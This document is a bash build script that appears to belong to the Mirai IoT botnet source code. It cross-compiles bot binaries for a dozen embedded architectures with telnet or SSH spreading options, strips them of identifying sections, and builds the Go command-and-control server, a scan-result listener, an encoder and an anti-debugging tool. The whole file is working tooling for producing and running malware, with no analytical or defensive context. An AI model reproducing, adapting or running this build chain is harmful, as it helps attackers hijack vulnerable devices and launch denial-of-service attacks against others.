FLAGS=""

function compile_bot {
    "/etc/xcompile/$1/bin/$1-gcc" -std=c99 $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "/etc/xcompile/$1/bin/$1-strip" release/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}

if [ $# == 2 ]; then
    if [ "$2" == "telnet" ]; then
        FLAGS="-DMIRAI_TELNET"
    elif [ "$2" == "ssh" ]; then
        FLAGS="-DMIRAI_SSH"
    fi
else
    echo "Missing build type." 
    echo "Usage: $0 <debug | release> <telnet | ssh>"
fi

if [ $# == 0 ]; then
    echo "Usage: $0 <debug | release> <telnet | ssh>"
elif [ "$1" == "release" ]; then
    rm release/mirai.*
    rm release/miraint.*
    go build -o release/cnc cnc/*.go
    compile_bot mips mirai.mips "$FLAGS -DKILLER_REBIND_SSH -static" #MIPS
    compile_bot mipsel mirai.mpsl "$FLAGS -DKILLER_REBIND_SSH -static" #MIPSEL
    compile_bot sh4 mirai.sh4 "$FLAGS -DKILLER_REBIND_SSH -static" #SH4
    compile_bot x86_64 mirai.x86 "$FLAGS -DKILLER_REBIND_SSH -static" #X86_64
    compile_bot armv4l mirai.arm4n "$FLAGS -DKILLER_REBIND_SSH -static" #ARMV4l
    compile_bot armv5l mirai.arm5n "$FLAGS -DKILLER_REBIND_SSH -static" #ARMV5l
    compile_bot armv6l mirai.arm6n "$FLAGS -DKILLER_REBIND_SSH -static" #ARMV6l
    compile_bot i686 mirai.i686 "$FLAGS -DKILLER_REBIND_SSH -static" #I686
    compile_bot powerpc mirai.ppc "$FLAGS -DKILLER_REBIND_SSH -static" #POWERPC
    compile_bot i586 mirai.i586 "$FLAGS -DKILLER_REBIND_SSH -static" #I586
    compile_bot m68k mirai.m68k "$FLAGS -DKILLER_REBIND_SSH -static" #M68K
    compile_bot sparc mirai.spc "$FLAGS -DKILLER_REBIND_SSH -static" #SPARC

    compile_bot mips miraint.mips "-static"
    compile_bot mipsel miraint.mpsl "-static"
    compile_bot sh4 miraint.sh4 "-static"
    compile_bot x86_64 miraint.x86 "-static"
    compile_bot armv4l miraint.arm4n "-static"
    compile_bot armv5l miraint.arm5n "-static"
    compile_bot armv6l miraint.arm6n "-static"
    compile_bot i686 miraint.i686 "-static"
    compile_bot powerpc miraint.ppc "-static"
    compile_bot i586 miraint.i586 "-static"
    compile_bot m68k miraint.m68k "-static"
    compile_bot sparc miraint.spc "-static"

    go build -o release/scanListen tools/scanListen.go
elif [ "$1" == "debug" ]; then
    gcc -std=c99 bot/*.c -DDEBUG "$FLAGS" -static -g -o debug/mirai.dbg
    /etc/xcompile/mips/bin/mips-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.mips #MIPS
    /etc/xcompile/mipsel/bin/mipsel-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.mpsl #MIPSEL
    /etc/xcompile/sh4/bin/sh4-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.sh4 #SH4
    /etc/xcompile/x86_64/bin/x86_64-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.x86 #X86_64
    /etc/xcompile/armv4l/bin/armv4l-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.arm4n #ARMV4l
    /etc/xcompile/armv5l/bin/armv5l-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.arm5n #ARMV5l
    /etc/xcompile/armv6l/bin/armv6l-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.arm6n #ARMV6l
    /etc/xcompile/i686/bin/i686-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.i686 #I686
    /etc/xcompile/powerpc/bin/powerpc-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.ppc #POWERPC
    /etc/xcompile/i586/bin/i586-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.i586 #I586
    /etc/xcompile/m68k/bin/m68k-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.m68k #M68K
    /etc/xcompile/sparc/bin/sparc-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.spc #SPARC
    
    gcc -std=c99 tools/enc.c -g -o debug/enc
    gcc -std=c99 tools/nogdb.c -g -o debug/nogdb
    gcc -std=c99 tools/badbot.c -g -o debug/badbot
    go build -o debug/cnc cnc/*.go
    go build -o debug/scanListen tools/scanListen.go
    echo -e "\e\x1b[31mCross Compiling Done...\x1b[37m"
else
    echo "Unknown parameter $1: $0 <debug | release>"
fi
